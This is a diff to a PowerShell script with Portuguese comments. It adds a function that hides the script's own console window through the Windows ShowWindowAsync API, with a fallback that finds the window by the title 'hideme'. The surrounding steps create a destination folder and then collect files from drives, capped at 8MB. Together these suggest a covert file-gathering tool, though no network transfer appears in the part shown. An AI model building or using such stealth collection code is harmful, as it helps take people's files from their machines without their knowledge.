@@ -299,9 +299,32 @@ if (-not (Test-Path -Path $destinationPath)) {
     Write-Host "Pasta criada: $destinationPath" -ForegroundColor Green
 }
 
-# --- Passo 3: Ocultar a janela (se não estiver em modo debug) ---
-Hide-Window
-
+# ============= 3: OCULTAÇÃO DA JANELA =============
+function Hide-Window {
+    Write-Host "Ocultando a janela..." -ForegroundColor Yellow
+    Start-Sleep 1
+    
+    try {
+        # Código original do HidePS (copiado do Pastebin)
+        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+        $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+        $hwnd = (Get-Process -PID $pid).MainWindowHandle
+        if ($hwnd -ne [System.IntPtr]::Zero) {
+            $Type::ShowWindowAsync($hwnd, 0)
+            Write-Host "Janela ocultada com sucesso (via PID)." -ForegroundColor Green
+        }
+        else {
+            $Host.UI.RawUI.WindowTitle = 'hideme'
+            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+            $hwnd = $Proc.MainWindowHandle
+            $Type::ShowWindowAsync($hwnd, 0)
+            Write-Host "Janela ocultada com sucesso (via título)." -ForegroundColor Green
+        }
+    }
+    catch {
+        Write-Host "Não foi possível ocultar a janela: $_" -ForegroundColor Red
+    }
+}
 # --- Passo 4: Coletar os arquivos (limitando a 8MB) ---
 $driveIndex = 0
 $collectedFiles = @()
